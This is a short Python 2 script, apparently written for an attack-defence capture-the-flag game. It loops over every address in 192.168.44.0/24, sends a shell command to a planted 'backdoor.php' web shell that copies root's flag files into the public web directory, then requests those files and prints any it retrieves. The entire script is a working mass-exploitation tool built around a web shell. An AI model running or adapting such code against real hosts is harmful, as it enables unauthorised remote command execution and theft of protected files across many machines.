import requests
for i in range(254):
	try:
		ip='http://192.168.44.'+str(i)
		url1=str(ip)+'/backdoor.php?cmd=cp /root/flag* /var/www/html/flag'
		url2=str(ip)+'/flag'
		requests.get(url1,timeout=0.1)
		re=requests.get(url2,timeout=0.1)
		if re.status_code==200:
			print ip,re.text
	except:
		pass
